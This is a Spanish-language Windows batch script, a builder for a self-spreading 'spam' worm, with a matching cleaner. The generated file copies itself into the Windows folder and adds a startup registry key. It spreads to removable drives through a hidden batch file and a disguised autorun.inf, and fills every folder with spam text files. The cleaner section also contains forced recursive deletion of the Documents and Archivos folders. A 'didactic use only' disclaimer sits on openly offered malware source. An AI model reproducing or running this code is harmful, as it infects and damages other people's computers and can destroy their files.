@echo off
:ini
color f0
mode con cols=30 lines=13
title Spamer -hhh-  v2.0
set Ä=ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
::-Created by Guerrerohgp-::
:strt
cls
set hgp=
echo. Ú%Ä%¿
echo.&echo.   1.Crear nuevo spamer.&echo.&echo.   2.Desinfectarte de virus.&echo.&echo.   3.INFO&echo.
echo. À%Ä%Ù
set /p hgp=          -^>
if not defined hgp goto strt
if t%hgp%==t1 goto createhhh
if t%hgp%==t2 goto quithhh
if t%hgp%==t3 goto info
goto strt

:createhhh
cls&echo. Cual es tu mensaje para hacer spam?&echo.&set /p G= -::^>
cls&echo.&echo. es tu mensaje?
echo.&echo %G%
echo.&echo.      1.si 2.no&&set /p es=::^>
if %es%==1 goto num
cls&goto createhhh

:num
cls&echo. Cuantos archivos spam deceas&echo. que se envien en cada &echo. carpeta?&echo.&set /p n= -::^>
if %n% lss 1 goto num
if %n% gtr 100 (msg * ERROR, SOLO NUMEROS Y SOLO HASTA 100&goto num)

echo ^@echo off>>%homedrive%\hh.cmd
echo title spam hhh>>%homedrive%\hh.cmd
echo if exist ^"%%windir%%\win.cmd^" goto spam>>%homedrive%\hh.cmd
echo copy /y %%0 ^"%%windir%%\win.cmd^">>%homedrive%\hh.cmd
echo reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v spm /t REG_SZ /d ^"%%windir%%\win.cmd^">>%homedrive%\hh.cmd
echo :spam>>%homedrive%\hh.cmd
echo for %%%%h in (b c d e f g h i j k l m n o p q r s t u v w x y z) do (set usb=%%%%h>>%homedrive%\hh.cmd
echo call:nm)>>%homedrive%\hh.cmd
echo goto hgp1>>%homedrive%\hh.cmd
echo :nm>>%homedrive%\hh.cmd
echo if exist %%usb%%:\ (copy /y %%0 "%%usb%%:\hgp.bat">>%homedrive%\hh.cmd
echo attrib +h "%%usb%%:\hgp.bat">>%homedrive%\hh.cmd
echo call :usbvir %%usb%%) else (goto:eof)>>%homedrive%\hh.cmd
echo :hgp1>>%homedrive%\hh.cmd
echo cd %%homedrive%%\>>%homedrive%\hh.cmd
echo call:shgp %%homedrive%%>>%homedrive%\hh.cmd
echo for /r /d %%%%g in (*) do call:shgp %%%%g>>%homedrive%\hh.cmd
echo exit>>%homedrive%\hh.cmd
echo :shgp>>%homedrive%\hh.cmd
echo for /l %%%%a in (1,2,%n%) do echo %G%^>^>%%^*\leeme%%%%a.txt>>%homedrive%\hh.cmd
echo goto:eof>>%homedrive%\hh.cmd
echo :usbvir>>%homedrive%\hh.cmd
echo echo [Autorun] ^>^> ^"%%1:\AutoRun.inf^">>%homedrive%\hh.cmd
echo echo open="hgp.bat" ^>^> ^"%%1:\AutoRun.inf^">>%homedrive%\hh.cmd
echo echo icon=%%windir%%\system32\shell32.dll,4 ^>^> ^"%%1:\AutoRun.inf^">>%homedrive%\hh.cmd
echo echo action=Abrir Carpeta para ver archivos. ^>^> ^"%%1:\AutoRun.inf^">>%homedrive%\hh.cmd
echo echo shell\open=Abrir ^>^> ^"%%1:\AutoRun.inf^">>%homedrive%\hh.cmd
echo attrib +h +s +r ^"%%1:\AutoRun.inf^">>%homedrive%\hh.cmd
echo goto:eof>>%homedrive%\hh.cmd
ren %homedrive%\hh.cmd %homedrive%\infectionhhh.cmd
cls
echo listo!!
msg * Archivo listo y guardado en %homedrive%\infectionhhh.cmd
msg * no ejecutes el archivo o te infectaras.
msg * Created By Guerrerohgp
pause >nul
cls&call %0
exit

:quithhh
cls
title hhh spam desinfector
del /f /q /s "%windir%\win.cmd"
reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v spm /f
call:sshgp %homedrive%
for %%h in (b c d e f g h i j k l m n o p q r s t u v w x y z) do (set usb=%%h
call:nm)
:nm
if exist "%usb%:\hgp.bat" del /f/q/s "%usb%:\hgp.bat"
if exist "%usb%:\AutoRun.inf" del /f/q/s "%usb%:\AutoRun.inf"
goto:eof
del /f/q/s %homedrive%\Archivos
del /f/q/s %homedrive%\Documents
cd %homedrive%\
for /r /d %%h in (*) DO call:sshgp %%h
exit
:sshgp
for /l %%a in (1,2,100) do del /f/q/s %*\leeme%%a.txt
goto:eof
pause>nul
exit
:info
cls
echo   Este scrip es de uso libre&echo.&echo. y solo con fines didacticos
echo.&echo.No soy Responsable del mal uso del scrip.
pause>nul
cls
echo.&echo.  %Ä%&echo.&echo.        Creado Por:&echo.&echo.&echo.        Guerrerohgp
echo.  %Ä% 
echo.    guerrerohgp@hotmail.com
pause>nul&cls
goto ini
